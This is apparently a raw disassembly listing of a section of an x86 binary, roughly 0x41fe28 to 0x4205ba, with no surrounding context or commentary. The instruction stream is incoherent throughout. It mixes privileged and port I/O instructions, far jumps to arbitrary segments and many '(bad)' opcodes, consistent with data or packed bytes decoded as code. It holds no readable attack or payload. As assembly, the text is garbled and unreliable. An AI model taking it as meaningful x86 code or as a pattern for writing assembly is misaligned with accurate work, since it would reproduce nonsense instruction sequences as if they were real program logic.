  41fe28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe29:	pop    ecx
  41fe2a:	jge    0x41fdb4
  41fe2c:	std    
  41fe2d:	or     BYTE PTR [esi],bh
  41fe2f:	push   edx
  41fe30:	into   
  41fe31:	push   edi
  41fe32:	in     eax,0xcb
  41fe34:	mov    ah,0x19
  41fe36:	fld    DWORD PTR [edx-0x290e5749]
  41fe3c:	cmp    eax,0xc0c4d76d
  41fe41:	push   edx
  41fe42:	push   es
  41fe43:	mov    edi,0xa2443d65
  41fe48:	addr16 pop ds
  41fe4a:	push   eax
  41fe4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4c:	push   ds
  41fe4d:	idiv   DWORD PTR [ebp+0x66]
  41fe50:	aaa    
  41fe51:	mov    DWORD PTR [edx],ebp
  41fe53:	mov    ds:0x989c3b4a,al
  41fe58:	jg     0x41fe00
  41fe5a:	fst    QWORD PTR [edi]
  41fe5c:	sub    ecx,edi
  41fe5e:	mov    esi,0xc8c43af2
  41fe63:	cmp    DWORD PTR [ebp+0x23],edi
  41fe66:	jmp    0x41fea1
  41fe68:	and    eax,0x917f1bbe
  41fe6d:	mov    ebx,0x971df90
  41fe72:	mov    al,BYTE PTR [eax+0x2a8e485f]
  41fe78:	rcr    DWORD PTR [ecx],cl
  41fe7a:	sbb    DWORD PTR [edx+ecx*8+0x0],ecx
  41fe7e:	sbb    al,0x4a
  41fe80:	and    cl,ch
  41fe82:	int3   
  41fe83:	ja     0x41fe38
  41fe85:	jo     0x41fec8
  41fe87:	pop    ebx
  41fe88:	push   eax
  41fe89:	loopne 0x41fe7a
  41fe8b:	sbb    cl,BYTE PTR [esi-0x4e47e79d]
  41fe91:	popf   
  41fe92:	xchg   edx,eax
  41fe93:	retf   0x5580
  41fe96:	test   al,0x3f
  41fe98:	jle    0x41feb1
  41fe9a:	xor    edx,DWORD PTR [eax+ebx*2]
  41fe9d:	add    al,0xdb
  41fe9f:	mov    esi,0x915669b3
  41fea4:	cmc    
  41fea5:	jo     0x41fe2e
  41fea7:	pop    eax
  41fea8:	jo     0x41ff20
  41feaa:	jne    0x41febe
  41feac:	dec    ecx
  41fead:	cmp    DWORD PTR [esp+ebp*4-0x69f01970],esp
  41feb4:	add    BYTE PTR [esi+edx*1-0x4e9bd701],al
  41febb:	sub    ch,dl
  41febd:	inc    edi
  41febe:	add    al,BYTE PTR [si]
  41fec1:	stos   BYTE PTR es:[edi],al
  41fec2:	cli    
  41fec3:	ret    
  41fec4:	or     BYTE PTR [edi-0x54e3415f],ch
  41feca:	arpl   WORD PTR [edx+0x9be321d],di
  41fed0:	in     al,dx
  41fed1:	cld    
  41fed2:	push   esi
  41fed3:	push   eax
  41fed4:	(bad)  
  41fed5:	mov    al,ds:0x861c6c8d
  41feda:	mov    ds:0x75cc7b25,eax
  41fedf:	scas   eax,DWORD PTR es:[edi]
  41fee0:	and    DWORD PTR [esi-0x36fc9215],edx
  41fee6:	xchg   ebx,eax
  41fee7:	and    DWORD PTR [ecx+0x3f],ebx
  41feea:	addr16 pop ecx
  41feec:	sar    ebp,cl
  41feee:	push   ecx
  41feef:	or     BYTE PTR [ebx+eax*8-0x299f0dcc],al
  41fef6:	dec    ebp
  41fef7:	pop    ss
  41fef8:	pop    ecx
  41fef9:	pop    es
  41fefa:	sti    
  41fefb:	push   edx
  41fefc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fefd:	sar    DWORD PTR [eax],1
  41feff:	xor    ecx,edx
  41ff01:	mov    bl,0xa9
  41ff03:	ret    0x2e6
  41ff06:	cmc    
  41ff07:	mov    ebp,0xe7e31968
  41ff0c:	cmp    al,0x67
  41ff0e:	outs   dx,BYTE PTR ds:[esi]
  41ff0f:	push   ebx
  41ff10:	retf   0x2c03
  41ff13:	outs   dx,BYTE PTR ds:[esi]
  41ff14:	sahf   
  41ff15:	test   DWORD PTR [esi+0x70],esp
  41ff18:	and    al,0x7e
  41ff1a:	out    dx,eax
  41ff1b:	mov    ebx,0x49979e04
  41ff20:	xchg   ebp,eax
  41ff21:	jmp    0x41ff09
  41ff23:	pop    esp
  41ff24:	dec    esp
  41ff25:	data16 and bl,0xb9
  41ff29:	shl    DWORD PTR [edi-0x7c],cl
  41ff2c:	call   0x3f3baf23
  41ff31:	stos   DWORD PTR es:[edi],eax
  41ff32:	dec    edi
  41ff33:	cmp    ebp,DWORD PTR [eax+0x172e45ab]
  41ff39:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41ff3b:	or     esp,DWORD PTR [eax]
  41ff3d:	mov    esi,0x76d82a8f
  41ff42:	xchg   esp,eax
  41ff43:	pop    esp
  41ff44:	out    dx,eax
  41ff45:	sbb    eax,0x5127add5
  41ff4a:	jno    0x41ff79
  41ff4c:	dec    esi
  41ff4d:	jno    0x41ff28
  41ff4f:	inc    eax
  41ff50:	mov    bl,bl
  41ff52:	dec    ebx
  41ff53:	jmp    0x504e0b36
  41ff58:	sahf   
  41ff59:	fild   WORD PTR [ebp-0x3ebb695c]
  41ff5f:	mov    esp,0xf02d919c
  41ff64:	mov    eax,ds:0x94d3c4e7
  41ff69:	mov    al,ds:0x90a26db1
  41ff6e:	test   BYTE PTR [eax],0x99
  41ff71:	nop
  41ff72:	adc    eax,0x4296717f
  41ff77:	mov    ch,0x4d
  41ff79:	aaa    
  41ff7a:	imul   edx,DWORD PTR [esi+eax*2+0x5a],0x3f4b71c5
  41ff82:	xchg   edi,eax
  41ff83:	inc    esp
  41ff84:	enter  0x9f33,0xfc
  41ff88:	xchg   ecx,eax
  41ff89:	mov    ds:0xd6cacb64,eax
  41ff8e:	push   0x992954a1
  41ff93:	pop    es
  41ff94:	test   BYTE PTR fs:[ebx-0xa59b6c],0xa5
  41ff9c:	jecxz  0x41ff5b
  41ff9e:	or     al,0xfd
  41ffa0:	test   BYTE PTR [ebx],ch
  41ffa2:	shr    ebp,1
  41ffa4:	ss into 
  41ffa6:	call   FWORD PTR [ebx+0x77]
  41ffa9:	xchg   esi,eax
  41ffaa:	ror    BYTE PTR [edi],1
  41ffac:	pushf  
  41ffad:	popa   
  41ffae:	xor    bh,BYTE PTR [ebx+0x76]
  41ffb1:	mov    ds:0x79591936,eax
  41ffb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb7:	sub    BYTE PTR [edx+0x5b6ebd64],ah
  41ffbd:	mov    es,esp
  41ffbf:	sti    
  41ffc0:	jge    0x41ff44
  41ffc2:	(bad)  
  41ffc3:	std    
  41ffc4:	aas    
  41ffc5:	cmovb  ecx,DWORD PTR [ecx-0x5e]
  41ffc9:	mov    dh,0x5d
  41ffcb:	ins    WORD PTR es:[edi],dx
  41ffcd:	leave  
  41ffce:	ja     0x41ff73
  41ffd0:	ror    BYTE PTR [eax-0x43],0x29
  41ffd4:	jp     0x41ffbd
  41ffd6:	jno    0x420025
  41ffd8:	xchg   ebp,eax
  41ffd9:	stos   DWORD PTR es:[edi],eax
  41ffda:	fdivr  DWORD PTR [edi+0x3d77aafc]
  41ffe0:	daa    
  41ffe1:	xor    eax,0xd2dd4c60
  41ffe6:	(bad)  
  41ffe7:	scas   eax,DWORD PTR es:[edi]
  41ffe8:	ins    BYTE PTR es:[edi],dx
  41ffe9:	aaa    
  41ffea:	or     esi,ebp
  41ffec:	rcl    dl,0xd5
  41ffef:	pop    ebx
  41fff0:	dec    edi
  41fff1:	xor    ebp,esi
  41fff3:	call   0x943e9c3a
  41fff8:	rol    DWORD PTR [edi+0x3f],cl
  41fffb:	inc    esp
  41fffc:	ja     0x420009
  41fffe:	mov    ebp,0xd61afa35
  420003:	stos   BYTE PTR es:[edi],al
  420004:	push   ebp
  420005:	xchg   edx,eax
  420006:	rdmsr  
  420008:	inc    eax
  420009:	pop    eax
  42000a:	add    esi,DWORD PTR ds:0x4c201d00
  420010:	call   0xf93c:0x8be12063
  420017:	pop    ebp
  420018:	mov    ecx,0xd2b0b4c8
  42001d:	(bad)  
  42001e:	in     eax,0x9f
  420020:	push   ds
  420021:	jp     0x41ffd8
  420023:	sub    esp,esi
  420025:	push   cs
  420026:	(bad)  
  420027:	and    BYTE PTR [esi],dl
  420029:	rcr    DWORD PTR [ecx-0x794be2ea],cl
  42002f:	inc    esp
  420030:	jno    0x41ffc9
  420032:	mov    ds:0xefb95485,al
  420037:	sar    BYTE PTR [ebp+0x57],1
  42003a:	cwde   
  42003b:	mov    ecx,0x4a5b01de
  420040:	lods   eax,DWORD PTR ds:[esi]
  420041:	mov    cl,0x94
  420043:	jmp    0x420040
  420045:	rcl    DWORD PTR [edx+edx*1-0x4],0x82
  42004a:	addr16 push 0x5c354eaa
  420050:	leave  
  420051:	push   ebp
  420052:	ins    BYTE PTR es:[edi],dx
  420053:	mov    ebp,0xddbb9bd1
  420058:	and    ebp,DWORD PTR [eax+0x2ff4eb1d]
  42005e:	push   eax
  42005f:	les    ecx,FWORD PTR [esp+edx*1]
  420062:	inc    ebp
  420063:	sbb    esp,ebx
  420065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420066:	aad    0xf9
  420068:	mov    edx,0x64267197
  42006d:	call   0xdf39:0xc814466b
  420074:	xchg   ebx,eax
  420075:	jae    0x42000d
  420077:	cmp    eax,0x97d7f093
  42007c:	mov    ebx,0x6d4583a5
  420081:	imul   ebx,DWORD PTR [eax+ecx*8],0x67c62977
  420088:	jns    0x42003b
  42008a:	pop    ebp
  42008b:	sar    DWORD PTR [ebx-0x66],1
  42008e:	dec    esp
  42008f:	aas    
  420090:	adc    ebx,DWORD PTR [ebp-0x7c]
  420093:	mov    ds:0x7b58f7e5,eax
  420098:	out    dx,al
  420099:	push   cs
  42009a:	stc    
  42009b:	jl     0x420105
  42009d:	xlat   BYTE PTR ds:[ebx]
  42009e:	aaa    
  42009f:	ret    0x1b18
  4200a2:	fisttp QWORD PTR [ecx+0x2c550fe1]
  4200a8:	and    bl,al
  4200aa:	rcl    DWORD PTR [esi-0x1d],0xce
  4200ae:	pop    es
  4200af:	and    bh,bh
  4200b1:	add    eax,DWORD PTR [edi+0x71]
  4200b4:	repz fwait
  4200b6:	rcl    BYTE PTR [ebx],1
  4200b8:	sub    dh,BYTE PTR [esp+ebp*1]
  4200bb:	shl    DWORD PTR [esi*4+0x68766cdc],0xe4
  4200c3:	jg     0x420075
  4200c5:	add    ah,BYTE PTR [edx]
  4200c7:	cmp    al,0x23
  4200c9:	clc    
  4200ca:	loop   0x42006d
  4200cc:	cmp    BYTE PTR [edx],ch
  4200ce:	or     edi,esp
  4200d0:	mov    ?,WORD PTR [edx-0x4]
  4200d3:	ret    
  4200d4:	or     DWORD PTR [ecx],ebp
  4200d6:	push   ebx
  4200d7:	mov    ds:0x3ac7cee8,eax
  4200dc:	xlat   BYTE PTR ds:[ebx]
  4200dd:	jbe    0x420072
  4200df:	retf   
  4200e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200e1:	cwde   
  4200e2:	bound  esp,QWORD PTR [edx]
  4200e4:	in     eax,dx
  4200e5:	push   esp
  4200e6:	loope  0x420092
  4200e8:	test   al,0x82
  4200ea:	aam    0x2f
  4200ec:	jo     0x42007f
  4200ee:	push   esi
  4200ef:	xor    BYTE PTR es:[edi+0x56],al
  4200f3:	add    BYTE PTR [edx-0x37],ah
  4200f6:	int3   
  4200f7:	jns    0x4200cb
  4200f9:	lods   al,BYTE PTR ds:[esi]
  4200fa:	ins    BYTE PTR es:[edi],dx
  4200fb:	and    ecx,DWORD PTR [edx-0x65]
  4200fe:	jbe    0x4200df
  420100:	adc    DWORD PTR [edx+0x1cb12d40],0xffffff9b
  420107:	pusha  
  420108:	rdpmc  
  42010a:	enter  0x6cb7,0xfd
  42010e:	sub    eax,0x5d294078
  420113:	popf   
  420114:	in     eax,dx
  420115:	fnsave [ebp-0x67418363]
  42011b:	jg     0x420112
  42011d:	int3   
  42011e:	fwait
  42011f:	out    0xf,eax
  420121:	sbb    eax,0x4c38ef51
  420126:	nop
  420127:	lock lods eax,DWORD PTR ds:[esi]
  420129:	addr16 dec ecx
  42012b:	adc    bh,BYTE PTR [ebx-0x4e]
  42012e:	inc    ebp
  42012f:	iret   
  420130:	hlt    
  420131:	fldcw  WORD PTR [ebp-0x61]
  420134:	test   DWORD PTR ds:0xefce65f,edi
  42013a:	add    BYTE PTR [esi],cl
  42013c:	mov    bl,0x57
  42013e:	es stos DWORD PTR es:[edi],eax
  420140:	stc    
  420141:	xchg   edx,eax
  420142:	shl    DWORD PTR [ebx+edi*4+0x6ca0c22c],0x6
  42014a:	stos   BYTE PTR es:[edi],al
  42014b:	retf   0x7bd0
  42014e:	cld    
  42014f:	cdq    
  420150:	arpl   ax,di
  420152:	imul   eax,DWORD PTR [edx-0x46],0xffffff88
  420156:	into   
  420157:	dec    ecx
  420158:	adc    eax,0xd63220ad
  42015d:	outs   dx,BYTE PTR ds:[esi]
  42015e:	lods   al,BYTE PTR ds:[esi]
  42015f:	mov    ch,0x39
  420161:	or     al,0xa9
  420163:	icebp  
  420164:	and    al,0xda
  420166:	dec    edx
  420167:	mov    eax,0xa4452c19
  42016c:	push   edi
  42016d:	push   ss
  42016e:	out    0x8b,al
  420170:	clc    
  420171:	data16 aad 0xd6
  420174:	cmp    BYTE PTR ds:0xf9b42f76,ah
  42017a:	xor    ecx,DWORD PTR [eax+0x64]
  42017d:	adc    al,BYTE PTR ds:0xca285fec
  420183:	test   DWORD PTR [edx],ecx
  420185:	test   BYTE PTR [ebx],al
  420187:	test   eax,0x80b5b49a
  42018c:	dec    edx
  42018d:	cmp    eax,0x6187e332
  420192:	and    DWORD PTR [ebx],ecx
  420194:	mov    al,ds:0xb69769bf
  420199:	mov    ebp,0x315b791a
  42019e:	jp     0x420129
  4201a0:	mov    edx,0xccb60321
  4201a5:	call   0x2896:0x76466d36
  4201ac:	icebp  
  4201ad:	cmp    ebp,DWORD PTR [edi+eax*1+0x34e9bc1e]
  4201b4:	jno    0x42020e
  4201b6:	or     DWORD PTR [esi],ebp
  4201b8:	jecxz  0x4201ae
  4201ba:	std    
  4201bb:	arpl   WORD PTR [ecx+ecx*1-0x3a],di
  4201bf:	out    dx,eax
  4201c0:	jae    0x420214
  4201c2:	sbb    eax,0x7a4c45c9
  4201c7:	ret    0x8caa
  4201ca:	and    eax,0x74dbb7a5
  4201cf:	cmp    BYTE PTR [ebx+0x25],ch
  4201d2:	jae    0x420248
  4201d4:	cmp    al,0x40
  4201d6:	in     al,dx
  4201d7:	cmp    DWORD PTR [ebx-0x17],ebp
  4201da:	repz mov eax,ds:0xcf3ceba
  4201e0:	outs   dx,DWORD PTR fs:[esi]
  4201e2:	addr16 jo 0x4201f2
  4201e5:	pop    ds
  4201e6:	or     esi,DWORD PTR [edx]
  4201e8:	int3   
  4201e9:	fwait
  4201ea:	rcl    BYTE PTR [esi],1
  4201ec:	loop   0x42024e
  4201ee:	addr16 jge 0x420196
  4201f1:	push   0xffffffbf
  4201f3:	fld    DWORD PTR [ebx+0x4e]
  4201f6:	cmp    edi,DWORD PTR [edi-0x63c4a476]
  4201fc:	dec    ebx
  4201fd:	fisubr WORD PTR [ebx]
  4201ff:	cwde   
  420200:	inc    edx
  420201:	mov    eax,DWORD PTR [edi-0x21]
  420204:	pushf  
  420205:	out    dx,al
  420206:	mov    al,0xce
  420208:	xchg   esp,eax
  420209:	push   cs
  42020a:	jl     0x42026b
  42020c:	stos   DWORD PTR es:[edi],eax
  42020d:	mov    esi,0xcd643271
  420212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420213:	inc    esp
  420214:	sub    eax,0x447e905a
  420219:	call   0x7e1a:0xa31ccfc4
  420220:	cdq    
  420221:	push   edi
  420222:	(bad)  
  420223:	lods   al,BYTE PTR ds:[esi]
  420224:	inc    ebp
  420225:	cmp    al,0xa9
  420227:	sub    eax,0x5cddbda3
  42022d:	xchg   edx,eax
  42022e:	xor    BYTE PTR [eax+0x7527cb2c],dh
  420234:	ins    BYTE PTR es:[edi],dx
  420235:	pop    eax
  420236:	out    dx,al
  420237:	aas    
  420238:	data16 sbb ch,BYTE PTR [edi]
  42023b:	jbe    0x420240
  42023d:	je     0x42029d
  42023f:	pop    edx
  420240:	sar    DWORD PTR [ebp-0x6ef58ac5],cl
  420246:	(bad)  
  420247:	sub    BYTE PTR [eax],cl
  420249:	adc    al,0x6b
  42024b:	fst    QWORD PTR [eax-0x63]
  42024e:	dec    ecx
  42024f:	adc    eax,0x50726008
  420254:	adc    eax,0x8fe1c41a
  420259:	dec    ecx
  42025a:	bound  esp,QWORD PTR [eax+0x2a576722]
  420260:	jae    0x4202b7
  420262:	xchg   ecx,eax
  420263:	jns    0x4202c5
  420265:	sbb    DWORD PTR [eax],eax
  420267:	rol    DWORD PTR [ebx+0x59c6cc3f],0xd3
  42026e:	dec    edi
  42026f:	push   cs
  420270:	pop    ss
  420271:	mov    ah,0xec
  420273:	loop   0x4202cc
  420275:	(bad)  
  420276:	test   al,0xbb
  420278:	or     ebx,DWORD PTR [esi-0x52]
  42027b:	out    0xd3,al
  42027d:	inc    edi
  42027e:	sbb    eax,0x8078f015
  420283:	cmc    
  420284:	xchg   BYTE PTR [edx+0x4a],dl
  420287:	mov    al,0x3d
  420289:	jns    0x420238
  42028b:	mov    eax,ds:0xcfc75c2b
  420290:	inc    esi
  420291:	cwde   
  420292:	cld    
  420293:	fimul  DWORD PTR [ebx-0x4f916c4e]
  420299:	ret    
  42029a:	sbb    al,al
  42029c:	add    BYTE PTR [edx],bh
  42029e:	mov    eax,0xc9f99e56
  4202a3:	adc    ebx,esi
  4202a5:	(bad)  
  4202a6:	leave  
  4202a7:	fwait
  4202a8:	test   BYTE PTR [ecx],0x3c
  4202ab:	(bad)  
  4202ac:	xchg   esp,eax
  4202ad:	int    0xcb
  4202af:	sub    BYTE PTR [edi+0x52],cl
  4202b2:	popa   
  4202b3:	mov    ebp,0x6257545f
  4202b8:	xchg   edi,eax
  4202b9:	mov    ch,0xdb
  4202bb:	dec    ebx
  4202bc:	mov    dh,BYTE PTR ds:0x6f72a79
  4202c2:	dec    esi
  4202c3:	xchg   ebp,eax
  4202c4:	mov    cl,0x3b
  4202c6:	jmp    0x3781:0x25b8d652
  4202cd:	mov    ecx,0x8d98996b
  4202d2:	or     edi,DWORD PTR [eax]
  4202d4:	clc    
  4202d5:	stos   DWORD PTR es:[edi],eax
  4202d6:	jp     0x420349
  4202d8:	mov    dl,0x4c
  4202da:	add    eax,ebp
  4202dc:	add    ebx,ebx
  4202de:	int3   
  4202df:	inc    esp
  4202e0:	sub    dl,BYTE PTR [ebx+0x20d278f1]
  4202e6:	mov    cl,0x83
  4202e8:	pop    ss
  4202e9:	mov    bh,0x69
  4202eb:	or     al,0x92
  4202ed:	pushf  
  4202ee:	scas   eax,DWORD PTR es:[edi]
  4202ef:	lock xor esi,DWORD PTR [edi+ecx*2-0x52]
  4202f4:	das    
  4202f5:	unpckhps xmm2,XMMWORD PTR [edx+0x4e]
  4202f9:	pop    edx
  4202fa:	dec    esi
  4202fb:	enter  0x705b,0x64
  4202ff:	out    0x12,eax
  420301:	cmp    eax,ecx
  420303:	adc    BYTE PTR [ebx],cl
  420305:	aad    0xff
  420307:	(bad)  
  420308:	sahf   
  420309:	xor    BYTE PTR [edi+ebp*1-0x3c],al
  42030d:	push   edi
  42030e:	je     0x4202b8
  420310:	scas   eax,DWORD PTR es:[edi]
  420311:	push   edx
  420312:	sbb    bl,cl
  420314:	outs   dx,BYTE PTR gs:[esi]
  420316:	inc    BYTE PTR [edx-0x17e58fb1]
  42031c:	inc    ebp
  42031d:	pop    ebx
  42031e:	(bad)  
  42031f:	jmp    0x4202b6
  420321:	dec    eax
  420322:	mov    esi,eax
  420324:	rcl    BYTE PTR [eax-0x1c],cl
  420327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420328:	push   es
  420329:	xchg   DWORD PTR [eax+0x39fadcc4],esp
  42032f:	sub    esi,DWORD PTR [eax+0x4b]
  420332:	loop   0x420356
  420334:	outs   dx,DWORD PTR ds:[esi]
  420335:	lock inc edx
  420337:	cmp    edi,DWORD PTR [esi]
  420339:	ja     0x4202c0
  42033b:	lds    edi,FWORD PTR [eax-0x8]
  42033e:	je     0x42030f
  420340:	vpcmpgtb xmm4,xmm1,XMMWORD PTR es:[edi+0x7f]
  420346:	push   edi
  420347:	mov    bl,dl
  420349:	cmp    BYTE PTR [ebx+0x4e],ah
  42034c:	push   edi
  42034d:	xor    eax,0x76d91ffc
  420352:	mov    al,ds:0x37d25206
  420357:	(bad)
  42035a:	adc    esi,esi
  42035c:	dec    edx
  42035d:	push   cs
  42035e:	je     0x42036b
  420360:	test   ah,0x2
  420363:	push   0x0
  420365:	fidivr WORD PTR [edx-0x4]
  420368:	and    BYTE PTR [ecx],al
  42036a:	jle    0x420319
  42036c:	fld    DWORD PTR [edi-0x28]
  42036f:	cmp    BYTE PTR [ebx-0xfd16ee4],dl
  420375:	dec    eax
  420376:	push   eax
  420377:	jg     0x4203b8
  420379:	inc    ebx
  42037a:	jl     0x42032e
  42037c:	xor    ecx,DWORD PTR [edi+0x35]
  42037f:	and    eax,0x2337eaa6
  420384:	cwde   
  420385:	jne    0x420379
  420387:	push   edi
  420388:	mov    bl,0xe1
  42038a:	test   DWORD PTR [ebx-0xeb24a38],edi
  420390:	sub    al,0x33
  420392:	cmp    BYTE PTR [eax-0x72560d8b],ch
  420398:	scas   al,BYTE PTR es:[edi]
  420399:	addr16 pop edx
  42039b:	test   eax,0x5f1fc7dd
  4203a0:	push   ebp
  4203a1:	sub    WORD PTR ds:0xf5cd63af,sp
  4203a8:	cmp    al,0x79
  4203aa:	lods   al,BYTE PTR ds:[esi]
  4203ab:	pusha  
  4203ac:	or     al,0x7d
  4203ae:	icebp  
  4203af:	cmc    
  4203b0:	clc    
  4203b1:	(bad)  
  4203b2:	cmp    esi,ecx
  4203b4:	cmp    eax,DWORD PTR [edi-0x543cc889]
  4203ba:	dec    eax
  4203bb:	ret    
  4203bc:	imul   ecx,edx,0xed61022b
  4203c2:	div    BYTE PTR [ecx+0x1f]
  4203c5:	iret   
  4203c6:	call   0xdd1bf76
  4203cb:	jb     0x4203dc
  4203cd:	lea    ebx,[eax]
  4203cf:	push   ss
  4203d0:	dec    ecx
  4203d1:	dec    esi
  4203d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203d3:	add    al,0x76
  4203d5:	dec    ebx
  4203d6:	pop    ds
  4203d7:	xor    eax,0x4e464979
  4203dc:	jmp    FWORD PTR [edi+esi*8+0x27ffc744]
  4203e3:	cmp    BYTE PTR ds:0x4fa3dbc2,0x0
  4203ea:	sbb    ah,dh
  4203ec:	enter  0x2ab3,0xad
  4203f0:	jg     0x420407
  4203f2:	sbb    esi,edx
  4203f4:	ins    DWORD PTR es:[edi],dx
  4203f5:	scas   al,BYTE PTR es:[edi]
  4203f6:	sub    ch,BYTE PTR [ecx-0x3db6d3a3]
  4203fc:	mov    edx,0x6245ce53
  420401:	sub    DWORD PTR [ebx-0x5],edx
  420404:	pop    ebp
  420405:	(bad)  
  420407:	mov    edx,0x259f5a68
  42040c:	mov    al,ds:0x67da9bac
  420411:	jmp    0xc1c3fc04
  420416:	pop    ebx
  420417:	add    eax,0x8b03f2bb
  42041c:	ficomp DWORD PTR [ebx]
  42041e:	mov    edx,0xfdc5fdb7
  420423:	inc    ecx
  420424:	push   ebx
  420425:	push   edi
  420426:	mul    dl
  420428:	retf   
  420429:	retf   0x4471
  42042c:	adc    dh,cl
  42042e:	dec    ecx
  42042f:	mov    bl,0x89
  420431:	add    BYTE PTR [edi+0x7fa23cdd],bl
  420437:	popa   
  420438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420439:	or     al,0x7d
  42043b:	iret   
  42043c:	pop    eax
  42043d:	mov    ds:0x40df04c1,eax
  420442:	out    dx,eax
  420443:	and    WORD PTR [ebx],ax
  420446:	dec    edi
  420447:	add    DWORD PTR [eax],ebp
  420449:	cmp    DWORD PTR [edx-0x5d],esp
  42044c:	das    
  42044d:	and    DWORD PTR [ebp-0x76e3f0f9],ecx
  420453:	mov    eax,ds:0x25b25623
  420458:	pop    eax
  420459:	pushf  
  42045a:	and    eax,0x9939edd3
  42045f:	push   esp
  420460:	stc    
  420461:	jae    0x4203ff
  420463:	pop    edi
  420464:	dec    esi
  420465:	or     BYTE PTR [eax+edx*8+0x6d0e406e],ch
  42046c:	icebp  
  42046d:	outs   dx,DWORD PTR ds:[esi]
  42046e:	add    cl,dh
  420470:	aas    
  420471:	mov    ds:0x39f65e0,eax
  420476:	jno    0x42040b
  420478:	jno    0x4204c9
  42047a:	jmp    0xf2c568bf
  42047f:	outs   dx,DWORD PTR ds:[esi]
  420480:	stos   BYTE PTR es:[edi],al
  420481:	sahf   
  420482:	xchg   BYTE PTR [edi-0x59],ch
  420485:	mov    bl,0xf0
  420487:	aad    0xd9
  420489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42048a:	sbb    ecx,DWORD PTR [bx+di+0x60]
  42048e:	and    al,0xd7
  420490:	jo     0x4204fe
  420492:	jl     0x420506
  420494:	jbe    0x420498
  420496:	ds inc eax
  420498:	outs   dx,DWORD PTR ds:[esi]
  420499:	sub    edi,DWORD PTR [ebp-0x26a927e7]
  42049f:	and    cl,BYTE PTR [edx+0x6c]
  4204a2:	xchg   ebp,eax
  4204a3:	push   ebp
  4204a4:	retf   0xd
  4204a7:	ret    
  4204a8:	es pop ss
  4204aa:	and    eax,0xa5168e4a
  4204af:	adc    eax,0x68cd9de2
  4204b4:	dec    ecx
  4204b5:	pop    cx
  4204b7:	cmp    ecx,edi
  4204b9:	inc    ebp
  4204ba:	out    0xf9,eax
  4204bc:	fidiv  WORD PTR [ecx]
  4204be:	call   DWORD PTR [ebp+0x3]
  4204c1:	loope  0x420517
  4204c3:	fs nop
  4204c5:	not    DWORD PTR [ebp+0x6]
  4204c8:	dec    esi
  4204c9:	push   ds
  4204ca:	mov    cl,0x26
  4204cc:	lods   eax,DWORD PTR ds:[esi]
  4204cd:	mov    esi,0xb394bd4f
  4204d2:	rol    BYTE PTR [ebx-0x28579658],cl
  4204d8:	jmp    0xbd8e:0x24f9840
  4204df:	or     BYTE PTR [eax+0x7a],bl
  4204e2:	inc    edi
  4204e3:	out    0x61,eax
  4204e5:	push   esi
  4204e6:	scas   eax,DWORD PTR es:[edi]
  4204e7:	mov    ebp,0x5b033406
  4204ec:	or     al,0x73
  4204ee:	add    dh,BYTE PTR [ebp+ebp*2+0x26]
  4204f2:	fs cmp eax,0xec07d056
  4204f8:	call   0x4125:0x2c3ed439
  4204ff:	cli    
  420500:	fild   WORD PTR [ecx+ebp*8-0x6b]
  420504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420505:	ret    
  420506:	and    al,0xa1
  420508:	leave  
  420509:	pop    es
  42050a:	inc    eax
  42050b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42050c:	adc    DWORD PTR [edi],esp
  42050e:	pusha  
  42050f:	stc    
  420510:	pushf  
  420511:	lods   al,BYTE PTR ds:[esi]
  420512:	inc    ecx
  420513:	cmc    
  420514:	push   esi
  420515:	(bad)  
  420516:	add    cl,0x58
  420519:	jmp    0x3675:0x8a86278c
  420520:	or     BYTE PTR [edx],dl
  420522:	loopne 0x420574
  420524:	test   BYTE PTR [ebx+eiz*4+0x54e2c879],dh
  42052b:	les    eax,FWORD PTR [edi]
  42052d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42052e:	mul    DWORD PTR [esi+0x5686968e]
  420534:	ret    
  420535:	jae    0x420593
  420537:	leave  
  420538:	pop    esi
  420539:	mov    esp,0x9b8ec777
  42053e:	cmp    eax,0xcdd888dd
  420543:	cdq    
  420544:	in     al,dx
  420545:	fbld   TBYTE PTR ss:[esi]
  420548:	mov    ah,0xe7
  42054a:	jb     0x4204e3
  42054c:	cmp    eax,0xab7c26a1
  420551:	pop    eax
  420552:	mov    ah,0xc5
  420554:	add    BYTE PTR [edx],dh
  420556:	retf   0x63b7
  420559:	and    eax,DWORD PTR [edi+0x6c]
  42055c:	arpl   WORD PTR [eax-0x47e733f1],bp
  420562:	jns    0x42052d
  420564:	out    dx,eax
  420565:	popf   
  420566:	xchg   esp,eax
  420567:	fsubrp st(3),st
  420569:	adc    DWORD PTR ds:0x893e1b0b,esi
  42056f:	pop    edi
  420570:	stos   DWORD PTR es:[edi],eax
  420571:	cld    
  420572:	fs enter 0x7bb9,0x7d
  420577:	rol    BYTE PTR [ebx],0xe9
  42057a:	adc    BYTE PTR [ebp+0x78],0x1b
  42057e:	jo     0x420524
  420580:	xchg   BYTE PTR [ebp+0x77],cl
  420583:	jg     0x420522
  420585:	mov    bl,0xe1
  420587:	es aam 0xfc
  42058a:	ds ret 0x3d21
  42058e:	lahf   
  42058f:	mov    bl,0xc8
  420591:	xchg   ebp,eax
  420592:	or     BYTE PTR [edx+edi*2],bh
  420595:	xchg   ebp,eax
  420596:	ins    BYTE PTR es:[edi],dx
  420597:	data16 in al,dx
  420599:	ror    BYTE PTR [ebp+0x5e],0xd8
  42059d:	jecxz  0x420530
  42059f:	sbb    BYTE PTR [edx-0x14],cl
  4205a2:	repz lea edi,[edi+edx*8+0x51a98ee]
  4205aa:	push   ss
  4205ab:	mov    eax,ds:0xe5698ad7
  4205b0:	mov    ah,0x2e
  4205b2:	dec    eax
  4205b3:	add    BYTE PTR [ebp-0x38],cl
  4205b6:	pop    es
  4205b7:	dec    esp
  4205b8:	mov    dl,0xbf
  4205ba:	push   ds
